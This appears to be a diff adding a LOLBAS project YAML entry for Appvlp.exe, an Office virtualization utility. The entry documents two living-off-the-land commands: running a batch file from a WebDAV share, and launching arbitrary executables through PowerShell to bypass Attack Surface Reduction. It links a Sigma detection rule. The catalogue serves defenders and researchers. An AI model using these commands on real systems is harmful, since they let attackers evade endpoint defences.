@@ -1,0 +1,42 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OtherMSBinaries/Appvlp.yml -->
+---
+Name: Appvlp.exe
+Description: Application Virtualization Utility Included with Microsoft Office 2016
+Author: Oddvar Moe
+Created: 2018-05-25
+Commands:
+  - Command: AppVLP.exe {PATH_SMB:.bat}
+    Usecase: Execution of BAT file hosted on Webdav server.
+    Description: Executes .bat file through AppVLP.exe
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: CMD
+  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
+    Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
+    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    OperatingSystem: Windows 10 w/Office 2016
+    Tags:
+      - Execute: EXE
+Full_Path:
+  - Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
+Resources:
+  - Link: https://github.com/MoooKitty/Code-Execution
+  - Link: https://twitter.com/moo_hax/status/892388990686347264
+  - Link: https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/
+  - Link: https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
+Acknowledgement:
+  - Person: fab
+    Handle: '@0rbz_'
+  - Person: Will
+    Handle: '@moo_hax'
+  - Person: Matt Wilson
+    Handle: '@enigma0x3'
